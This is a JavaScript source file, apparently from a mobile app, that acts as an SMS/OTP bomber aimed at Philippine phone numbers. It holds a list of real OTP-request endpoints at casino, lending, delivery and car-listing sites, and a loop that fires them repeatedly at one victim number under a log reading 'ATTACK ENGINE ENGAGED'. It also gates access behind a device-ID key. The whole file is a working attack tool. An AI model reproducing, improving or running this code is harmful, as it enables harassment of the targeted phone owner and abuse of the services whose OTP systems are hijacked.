const apiList = [
    { name: "LAKIWIN", fire: (t) => axios.post("https://www.lakiwin.com/service/mobile/check", {"phoneNumber": "0" + t, "otpType": "LOGIN_OTP"}, {headers: {"Content-Type": "application/json;charset=UTF-8"}, timeout: 10000}) },
    { name: "S5_CASINO", fire: (t) => axios.post("https://api.s5.com/player/api/v1/otp/request", "phone_number=%2B63" + t, {headers: {"Content-Type": "application/x-www-form-urlencoded"}, timeout: 10000}) },
    { name: "FINBRO", fire: (t) => axios.post("https://api.finbro.ph/web/public/client/phone/sms-code", {"mobilePhone": {"number": "0" + t}}, {headers: {"Content-Type": "application/json;charset=UTF-8"}, timeout: 10000}) },
    { name: "BISTRO", fire: (t) => axios.post("https://bistrodelivers.com.ph/p/api/s/v2/brand_venues/bvhvXayDs85SAFAZo6g6qctA/customers/otp", {"phone_number": t, "dial_code": "+63", "phone_country": "PH", "channel": "sms"}, {headers: {"Content-Type": "application/json"}, timeout: 10000}) },
    { name: "FASTCASH", fire: (t) => axios.post("https://api.fastcash.ph/v1/auth/otp", {"phone_number": "63" + t}, {headers: {"Content-Type": "application/json"}, timeout: 25000}) },
    { name: "CARMUDI", fire: (t) => axios.post("https://ucrf.carbay.com/sms/send-otp?countryCode=ph&langCode=en&businessUnit=cars&currencyCode=%E2%82%B1&isdCode=%2B63&pageType=used_lead&categoryId=1", {"otp": "", "mobile": t, "name": "jared daulfrish", "siteName": "www.carmudi.com.ph", "businessUnit": "cars", "categoryId": "1", "countryCode": "ph", "currencyCode": "₱", "isdCode": "+63", "langCode": "en", "pageType": "used_lead"}, {headers: {"content-type": "application/json; charset=UTF-8"}, timeout: 10000}) }
];

async function checkAccess() {
    const { identifier } = await Capacitor.Plugins.Device.getId();
    const expectedKey = identifier + "JARED";
    if (identifier === "a6604ff06fa2e862" || localStorage.getItem("user_access_token") === expectedKey) {
        document.getElementById('main-app-interface').style.display = 'block';
        return;
    }
    const userKey = prompt("DEVICE ID: " + identifier + "\n\nRESTRICTED ACCESS: Enter Key to unlock.");
    if (userKey === expectedKey) {
        localStorage.setItem("user_access_token", userKey);
        document.getElementById('main-app-interface').style.display = 'block';
    } else {
        window.location.href = "https://www.facebook.com/jaredvxx";
    }
}
window.onload = checkAccess;

async function start() {
    const num = document.getElementById('num').value;
    const amount = document.getElementById('otpAmount').value;
    const log = document.getElementById('log');

    if(!num || num.length < 10) {
        alert("VALIDATION ERROR: Please enter a 10-digit number.");
        return;
    }

    log.innerHTML = "[+] ATTACK ENGINE ENGAGED...<br>";

    for(let i=1; i<=amount; i++) {
        // Randomly pick one from your list
        const api = apiList[Math.floor(Math.random() * apiList.length)];
        log.innerHTML += "[RUNNING] " + api.name + " Attack Cycle #" + i + "...<br>";
        
        try {
            await api.fire(num);
            log.innerHTML += "<span style='color: #0f0;'>[SUCCESS] Packet Delivered.</span><br>";
        } catch (e) {
            log.innerHTML += "<span style='color: #f00;'>[FAILED] Request Blocked.</span><br>";
        }

        log.scrollTop = log.scrollHeight;
        await new Promise(r => setTimeout(r, 1500));
    }
    log.innerHTML += "[!] TASK COMPLETED SUCCESSFULLY.<br>";
}
